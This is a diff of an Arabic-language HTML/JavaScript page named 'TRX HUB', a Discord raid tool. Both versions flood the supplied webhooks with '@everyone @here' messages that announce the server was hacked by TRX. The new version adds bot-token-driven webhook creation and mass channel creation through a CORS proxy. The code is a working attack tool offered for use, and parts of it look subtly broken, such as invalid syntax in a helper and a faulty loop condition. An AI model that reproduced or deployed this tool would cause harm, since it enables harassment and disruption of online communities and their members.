@@ -1,227 +1,226 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>☣️ TRX HUB ☣️ · </title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Segoe UI', Arial, sans-serif;
-            background: #0a0a0a; color: #fff;
-            display: flex; justify-content: center; align-items: center;
-            min-height: 100vh; margin: 0;
-        }
-        .box {
-            background: #111;
-            border: 1px solid #2a2a2a;
-            border-radius: 30px; padding: 40px;
-            width: 520px; max-width: 95%; text-align: center;
-        }
-        h1 { color: #ff1a1a; letter-spacing: 5px; margin: 0 0 5px; font-size: 42px; }
-        .sub { color: #555; font-size: 12px; margin: 0 0 20px; letter-spacing: 3px; }
-        input, textarea {
-            width: 100%; padding: 15px 20px; box-sizing: border-box;
-            background: #1a1a1a; border: 1px solid #333;
-            border-radius: 30px; color: #fff; font-size: 14px;
-            direction: ltr; text-align: left; outline: none;
-            font-family: inherit;
-        }
-        input:focus { border-color: #ff1a1a; }
-        .row { display: flex; gap: 10px; margin: 20px 0; }
-        .b1 {
-            flex: 1; padding: 16px; background: #cc0000; color: #fff;
-            border: none; border-radius: 30px; font-size: 16px;
-            font-weight: 700; cursor: pointer; letter-spacing: 3px;
-            transition: 0.2s;
-        }
-        .b1:hover:not(:disabled) { background: #ff1a1a; transform: scale(1.02); }
-        .b1:disabled { opacity: 0.3; cursor: not-allowed; }
-        .b2 {
-            flex: 1; padding: 16px; background: #222; color: #888;
-            border: 1px solid #444; border-radius: 30px; font-size: 16px;
-            font-weight: 700; cursor: pointer; letter-spacing: 3px;
-            transition: 0.2s;
-        }
-        .b2:hover:not(:disabled) { background: #cc0000; color: #fff; border-color: #cc0000; }
-        .b2:disabled { opacity: 0.3; cursor: not-allowed; }
-        .stat { color: #888; font-size: 14px; margin: 5px 0; }
-        #cnt { color: #00ff88; font-size: 28px; font-weight: 700; }
-        #log {
-            width: 100%; height: 180px; margin-top: 12px;
-            background: #050505; color: #00ff88;
-            border: 1px solid #2a2a2a; border-radius: 16px;
-            padding: 15px; font-family: 'Courier New', monospace; font-size: 12px;
-            direction: ltr; text-align: left; resize: none; overflow-y: auto;
-        }
-        .badge { color: #ff1a1a; font-size: 11px; margin-top: 10px; letter-spacing: 2px; opacity: 0.6; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>☣️ TRX ☣️</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Arial,sans-serif;background:#0a0a0a;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
+.box{background:#111;border:1px solid #2a2a2a;border-radius:30px;padding:40px;width:620px;max-width:100%;text-align:center}
+h1{color:#ff1a1a;letter-spacing:5px;font-size:42px;margin:0 0 5px}
+.sub{color:#555;font-size:12px;margin:0 0 20px;letter-spacing:3px}
+input,textarea{width:100%;padding:12px 18px;background:#1a1a1a;border:1px solid #333;border-radius:30px;color:#fff;font-size:13px;outline:none;font-family:inherit;margin-bottom:8px;direction:ltr;text-align:left}
+input:focus{border-color:#ff1a1a}
+textarea{border-radius:16px;height:140px;margin-top:10px;background:#050505;color:#00ff88;font-family:'Courier New',monospace;font-size:11px;resize:none;overflow-y:auto}
+.row{display:flex;gap:8px;margin:5px 0;flex-wrap:wrap}
+.row>*{flex:1;min-width:100px}
+.btn{padding:12px 16px;border:none;border-radius:30px;font-size:14px;font-weight:700;cursor:pointer;letter-spacing:2px;transition:.2s}
+.btn:hover:not(:disabled){transform:scale(1.02)}
+.btn:disabled{opacity:.3;cursor:not-allowed}
+.r{background:#cc0000;color:#fff}
+.r:hover:not(:disabled){background:#ff1a1a}
+.g{background:#006600;color:#fff}
+.g:hover:not(:disabled){background:#009900}
+.b{background:#003366;color:#fff}
+.b:hover:not(:disabled){background:#0055aa}
+.d{background:#222;color:#888;border:1px solid #444}
+.d:hover:not(:disabled){background:#cc0000;color:#fff;border-color:#cc0000}
+.sec{background:#0d0d0d;border:1px solid #222;border-radius:20px;padding:15px;margin:10px 0;text-align:left}
+.st{color:#888;font-size:13px;margin:3px 0}
+#cnt{color:#00ff88;font-size:28px;font-weight:700}
+.wi{display:flex;gap:5px;align-items:center;margin-bottom:5px}
+.wi input{flex:1;margin-bottom:0}
+.wi button{background:#660000;color:#fff;border:none;border-radius:30px;padding:12px 14px;cursor:pointer}
+.wi button:hover{background:#990000}
+.gr{display:grid;grid-template-columns:1fr 1fr;gap:5px}
+.it{background:#0a0a0a;padding:8px 12px;border-radius:12px;border:1px solid #1a1a1a}
+.lb{color:#555;font-size:10px;letter-spacing:1px}
+.vl{color:#fff;font-size:13px;word-break:break-all}
+.note{color:#886600;font-size:11px;padding:8px 12px;background:#1a1100;border-radius:12px;margin:5px 0;border:1px solid #332200;text-align:center}
+.cb{display:flex;align-items:center;gap:10px;margin:5px 0}
+.cb input{width:auto;margin:0}
+.cb label{font-size:13px;color:#888}
+.bg{color:#ff1a1a;font-size:11px;margin-top:10px;letter-spacing:2px;opacity:.6}
+.sm{padding:8px 14px;font-size:12px}
+#is{display:none}
+</style>
 </head>
 <body>
 <div class="box">
-    <h1>☠️ TRX</h1>
-    <p class="sub">● @everyone + اسم TRX ☣️ + صوره ●</p>
-    <input type="text" id="wh" placeholder="https://discord.com/api/webhooks/...">
-    <div class="row">
-        <button class="b1" id="go" onclick="START()">💀 ابدأ</button>
-        <button class="b2" id="stp" onclick="STOP()" disabled>⛔ إيقاف</button>
-    </div>
-    <div class="stat">الرسائل المرسلة:</div>
-    <div id="cnt">0</div>
-    <textarea id="log" readonly placeholder="..."></textarea>
-    <div class="badge">● ☣️ TRX ☣️ HUB ☣️ ●</div>
+<h1>☠️ TRX</h1>
+<p class="sub">● فحص + سبام + ويبهوكات + رومات ●</p>
+<div class="row">
+<input type="text" id="wh" placeholder="https://discord.com/api/webhooks/..." style="flex:3">
+<button class="btn b" id="sc" onclick="SC()" style="flex:1">🔍فحص</button>
+</div>
+
+<div class="sec" id="is">
+<div class="st" style="color:#ff1a1a;font-size:13px;letter-spacing:2px;margin-bottom:10px">📋 معلومات</div>
+<div class="gr">
+<div class="it"><div class="lb">السيرفر</div><div class="vl" id="gn">-</div></div>
+<div class="it"><div class="lb">ID السيرفر</div><div class="vl" id="gi">-</div></div>
+<div class="it"><div class="lb">القناة</div><div class="vl" id="cn">-</div></div>
+<div class="it"><div class="lb">ID القناة</div><div class="vl" id="ci">-</div></div>
+<div class="it"><div class="lb">اسم الويبهوك</div><div class="vl" id="wn">-</div></div>
+<div class="it"><div class="lb">ID الويبهوك</div><div class="vl" id="wi">-</div></div>
+</div>
+<div id="ow" style="margin-top:8px"></div>
+</div>
+
+<div class="sec">
+<div class="st" style="color:#ff1a1a;font-size:13px;letter-spacing:2px;margin-bottom:10px">🤖 بوت (للرومات)</div>
+<input type="text" id="bt" placeholder="ODIzNTI4MDAxMjM0NTY3ODkw.GHkLmN.xx">
+<div class="row">
+<input type="text" id="px" class="sm" value="https://api.allorigins.win/raw?url=" style="flex:3">
+<span style="flex:1;font-size:11px;color:#666;display:flex;align-items:center">بروكسي</span>
+</div>
+</div>
+
+<div class="sec">
+<div class="st" style="color:#ff1a1a;font-size:13px;letter-spacing:2px;margin-bottom:10px">🔗 الويبهوكات</div>
+<div id="wl">
+<div class="wi">
+<input type="text" class="wu" placeholder="https://discord.com/api/webhooks/...">
+<button onclick="RM(this)">✕</button>
+</div>
+</div>
+<button class="btn d" onclick="AD()" style="width:100%;margin-top:5px">➕ إضافة</button>
+</div>
+
+<div class="row" style="margin:10px 0">
+<button class="btn g" id="cwb" onclick="CW()">🆕إنشاء</button>
+<button class="btn r" id="go" onclick="GO()">💀ابدأ</button>
+<button class="btn d" id="st" onclick="STOP()" disabled>⛔إيقاف</button>
+</div>
+
+<div class="cb">
+<input type="checkbox" id="cc" checked>
+<label for="cc">إنشاء رومات ☣️TRX☣️</label>
+</div>
+
+<div class="st">الرسائل:</div>
+<div id="cnt">0</div>
+<textarea id="log" readonly></textarea>
+<div class="bg">● ☣️ TRX ☣️ HUB ☣️ ●</div>
 </div>
 
 <script>
-let running = false, stopped = false, sent = 0, allTimers = [];
+let R=false,S=false,N=0,TM=[],CH=[],WH=null;
+const AV='https://github.com/Rxz60/MR-HUB/raw/refs/heads/main/IMG_5011.jpeg';
+const $(i)=>document.getElementById(i);
+const L=(m)=>{const e=$('log');e.value+=`[${new Date().toLocaleTimeString('ar-SA')}] ${m}\n`;e.scrollTop=e.scrollHeight};
 
-function $(id) { return document.getElementById(id); }
-
-function log(msg) {
-    const el = $('log');
-    const time = new Date().toLocaleTimeString('ar-SA');
-    el.value += `[${time}] ${msg}\n`;
-    el.scrollTop = el.scrollHeight;
+async function SC(){
+const u=$('wh').value.trim();
+if(!u){alert('حط رابط');return}
+const m=u.match(/discord\.com\/api\/webhooks\/(\d+)\/([A-Za-z0-9_-]+)/);
+if(!m){L('❌ رابط غير صالح');return}
+const id=m[1],tk=m[2];
+L('🔍 جاري الفحص...');
+try{
+const r=await fetch(`https://discord.com/api/webhooks/${id}/${tk}`,{method:'GET',headers:{'Content-Type':'application/json'}});
+if(!r.ok){
+L(`⚠️ فشل (${r.status}) - CORS`);
+$('gn').textContent='-';$('gi').textContent=id;$('cn').textContent='-';$('ci').textContent='-';$('wn').textContent='-';$('wi').textContent=id;
+$('is').style.display='block';return
+}
+const d=await r.json();WH=d;
+$('gn').textContent=d.name||'-';$('gi').textContent=d.guild_id||'-';$('cn').textContent='-';$('ci').textContent=d.channel_id||'-';$('wn').textContent=d.name||'-';$('wi').textContent=d.id||id;
+$('is').style.display='block';
+const q=document.querySelectorAll('.wu');let f=false;
+for(const e of q){if(e.value.trim()===u){f=true;break}}
+if(!f){const q2=document.querySelector('.wu');if(q2&&!q2.value.trim())q2.value=u;else ADW(u)}
+L(`✅ ${d.name||'تم'} | ID: ${d.id}`);
+$('ow').innerHTML='<div class="note">ℹ️ باقي الويبهوكات تحتاج بوت</div>';
+}catch(e){L(`❌ ${e.message}`)}
 }
 
+function AD(){const l=$('wl'),d=document.createElement('div');d.className='wi';d.innerHTML='<input type="text" class="wu" placeholder="https://discord.com/api/webhooks/..."><button onclick="RM(this)">✕</button>';l.appendChild(d)}
+function ADW(v){const l=$('wl'),d=document.createElement('div');d.className='wi';d.innerHTML=`<input type="text" class="wu" value="${v}" placeholder="https://discord.com/api/webhooks/..."><button onclick="RM(this)">✕</button>`;l.appendChild(d)}
+function RM(b){const q=document.querySelectorAll('.wi');if(q.length<=1){L('⚠️ لازم ويبهوك واحد على الأقل');return}b.parentElement.remove()}
+function GA(){const q=document.querySelectorAll('.wu'),u=[];for(const e of q){const v=e.value.trim();if(v)u.push(v)}return u}
 
-const AVATAR_URL = 'https://github.com/Rxz60/MR-HUB/raw/refs/heads/main/IMG_5011.jpeg';
-
-
-async function sendMsg(wh, text) {
-    if (stopped) return;
-    try {
-        await fetch(wh, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                content: text,
-                username: ' ☣️ TRX HUB ☣️',
-                avatar_url: AVATAR_URL   
-            })
-        });
-        sent++;
-        $('cnt').textContent = sent;
-    } catch (e) {}
+async function CW(){
+const u=$('wh').value.trim(),tk=$('bt').value.trim(),px=$('px').value.trim();
+if(!u){alert('حط رابط');return}
+if(!tk){alert('حط بوت توكين');return}
+const m=u.match(/discord\.com\/api\/webhooks\/(\d+)\/([A-Za-z0-9_-]+)/);
+if(!m){L('❌ رابط غير صالح');return}
+if(!WH||!WH.channel_id){L('❌ اضغط فحص أول');return}
+const cid=WH.channel_id,url=px+encodeURIComponent(`https://discord.com/api/v10/channels/${cid}/webhooks`);
+L('🆕 إنشاء ويبهوك...');
+try{
+const r=await fetch(url,{method:'POST',headers:{'Content-Type':'application/json','Authorization':`Bot ${tk}`},body:JSON.stringify({name:'TRX ☣️'})});
+if(r.ok){const d=await r.json(),wu=`https://discord.com/api/webhooks/${d.id}/${d.token}`;L('✅ تم');ADW(wu);$('wh').value=wu}
+else{const t=await r.text();L(`❌ ${r.status} ${t.slice(0,60)}`)}
+}catch(e){L(`❌ ${e.message}`)}
 }
 
-async function renameAndAvatarBot(wh) {
-    if (stopped) return;
-    try {
-        const r = await fetch(wh, {
-            method: 'PATCH',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                name: '☣️ TRX HUB ☣️',
-                avatar: AVATAR_URL   
-            })
-        });
-        if (r.ok) {
-            log('✅ PATCH: تم تغيير الاسم + الصورة للويب هوك');
-        } else {
-            const errText = await r.text().catch(() => '');
-            log(`❌ PATCH فشل (${r.status}) - ${errText.slice(0, 60)}`);
-            log('⚠️ لكن كل رسالة تطلع بالاسم والصورة المطلوبة');
-        }
-    } catch (e) {
-        log(`⚠️ PATCH CORS: ${e.message}. كل رسالة فيها الاسم TRX ☣️ والصورة`);
-    }
+async function MKCH(){
+const tk=$('bt').value.trim(),px=$('px').value.trim();
+if(!tk){L('⚠️ مافي بوت توكين');return false}
+if(!WH||!WH.guild_id){L('❌ اضغط فحص أول');return false}
+const gid=WH.guild_id;let sc=0;
+for(let i=0;i<5;i++){
+if(S)break;const nm=`☣️trx☣️-${i+1}`;
+try{
+const r=await fetch(px+encodeURIComponent(`https://discord.com/api/v10/guilds/${gid}/channels`),{method:'POST',headers:{'Content-Type':'application/json','Authorization':`Bot ${tk}`},body:JSON.stringify({name:nm,type:0})});
+if(r.ok){const d=await r.json();CH.push(d.id);sc++;L(`✅ #${nm}`)}
+else{if(r.status===0)L('⚠️ CORS - جرب بروكسي');const t=await r.text();L(`❌ ${r.status}`);break}
+}catch(e){L(`❌ ${e.message}`);break}
+}
+if(sc>0)L(`🔥 ${sc} روم`);
+return sc>0
 }
 
-
-
-function loop1(wh, txt) {
-    if (stopped) return;
-    for (let i = 0; i < 25; i++) sendMsg(wh, txt);
-    const t = setTimeout(() => loop1(wh, txt), 100);
-    allTimers.push(t);
+async function RMCH(){
+const tk=$('bt').value.trim(),px=$('px').value.trim();
+if(CH.length===0)return
+if(!tk){L('⚠️ مافي بوت');return}
+L(`🗑️ حذف ${CH.length}...`);let d=0;
+for(const id of CH){
+if(S)break
+try{
+const r=await fetch(px+encodeURIComponent(`https://discord.com/api/v10/channels/${id}`),{method:'DELETE',headers:{'Authorization':`Bot ${tk}`}});
+if(r.ok||r.status===404)d++
+else{if(r.status===0)L('⚠️ CORS');const t=await r.text();L(`❌ ${r.status}`)}
+}catch(e){L(`❌ ${e.message}`)}
+}
+L(`✅ حذف ${d} روم`);CH=[]
 }
 
-function loop2(wh, txt) {
-    if (stopped) return;
-    for (let i = 0; i < 20; i++) sendMsg(wh, txt);
-    const t = setTimeout(() => loop2(wh, txt), 150);
-    allTimers.push(t);
+async function SM(wh,t){
+if(S)return
+try{await fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:t,username:'☣️ TRX HUB ☣️',avatar_url:AV})});N++;$('cnt').textContent=N}catch(e){}
+}
+async function SA(t){const u=GA();for(const w of u)SM(w,t)}
+
+function L1(t){if(S)return;for(let i=0;i<30;i++)SA(t);TM.push(setTimeout(()=>L1(t),80))}
+function L2(t){if(S)return;for(let i=0;i<25;i++)SA(t);TM.push(setTimeout(()=>L2(t),120))}
+function L3(t){if(S)return;for(let i=0;i<20;i++)SA(t);TM.push(setTimeout(()=>L3(t),100))}
+function L4(t){if(S)return;for(let i=0;i=30;i++)SA(t);TM.push(setTimeout(()=>L4(t),60))}
+
+async function GO(){
+const u=GA();if(u.length===0){alert('⚠️ أضف ويبهوك');return}
+if(R)return
+R=true;S=false;N=0;CH=[];TM=[]
+$('cnt').textContent='0';$('go').disabled=true;$('st').disabled=false;$('sc').disabled=true;$('cwb').disabled=true;$('log').value=''
+L('🚀 TRX ☣️ DESTROYER');L(`📌 ${u.length} ويبهوك`)
+const txt='@everyone @here تم التهكير من قبل TRX | HUB - النظام التراكسي - ☣️ @here @everyone'
+L1(txt);L2(txt);L3(txt);L4(txt)
+if($('cc').checked){L('🏗️ رومات...');await MKCH()}
+TM.push(setInterval(()=>{if(S){clearInterval(this);return};L(`📊 ${N}`)},5000))
 }
 
-function loop3(wh, txt) {
-    if (stopped) return;
-    for (let i = 0; i < 20; i++) sendMsg(wh, txt);
-    const t = setTimeout(() => loop3(wh, txt), 200);
-    allTimers.push(t);
-}
-
-function loop4(wh, txt) {
-    if (stopped) return;
-    for (let i = 0; i < 15; i++) sendMsg(wh, txt);
-    const t = setTimeout(() => loop4(wh, txt), 80);
-    allTimers.push(t);
-}
-
-function loop5(wh, txt) {
-    if (stopped) return;
-    for (let i = 0; i < 30; i++) sendMsg(wh, txt);
-    const t = setTimeout(() => loop5(wh, txt), 120);
-    allTimers.push(t);
-}
-
-function patchLoop(wh) {
-    if (stopped) return;
-    renameAndAvatarBot(wh);
-    const t = setTimeout(() => patchLoop(wh), 5000);
-    allTimers.push(t);
-}
-
-
-
-function START() {
-    const wh = $('wh').value.trim();
-    if (!wh) { alert('⚠️ حط رابط Webhook أول!'); return; }
-    if (running) return;
-
-    running = true; stopped = false; sent = 0;
-    allTimers = [];
-    $('cnt').textContent = '0';
-    $('go').disabled = true;
-    $('stp').disabled = false;
-    $('log').value = '';
-
-    log('🚀 بدء الهجوم — TRX ☣️ DESTROYER');
-    log('📌 الاسم: TRX ☣️');
-    log('📌 الصورة: MR-HUB');
-    log('⚠️  ما يوقف إلا إذا ضغطت إيقاف');
-
-    const msg = '@everyone @here تم التهكير من قبل TRX | HUB - النظام التراكسي - ☣️  @here @everyone';
-    loop1(wh, msg);
-    loop2(wh, msg);
-    loop3(wh, msg);
-    loop4(wh, msg);
-    loop5(wh, msg);
-    patchLoop(wh);
-
-    const report = setInterval(() => {
-        if (stopped) { clearInterval(report); return; }
-        log(`📊 إجمالي الرسائل: ${sent}`);
-    }, 5000);
-    allTimers.push(report);
-
-
-    setTimeout(() => renameAndAvatarBot(wh), 500);
-}
-
-function STOP() {
-    if (!running) return;
-    log('⛔ جاري الإيقاف...');
-    stopped = true;
-    for (const t of allTimers) clearTimeout(t);
-    allTimers = [];
-    setTimeout(() => {
-        running = false;
-        $('go').disabled = false;
-        $('stp').disabled = true;
-        log(`🛑 توقف. المجموع: ${sent} رسالة`);
-    }, 300);
+async function STOP(){
+if(!R)return
+L('⛔ إيقاف...');S=true
+for(const t of TM)clearTimeout(t);TM=[]
+if(CH.length>0){L('🗑️ حذف الرومات...');await RMCH()}
+setTimeout(()=>{R=false;$('go').disabled=false;$('st').disabled=true;$('sc').disabled=false;$('cwb').disabled=false;L(`🛑 ${N} رسالة`)},300)
 }
 </script>
+</div>
 </body>
 </html>
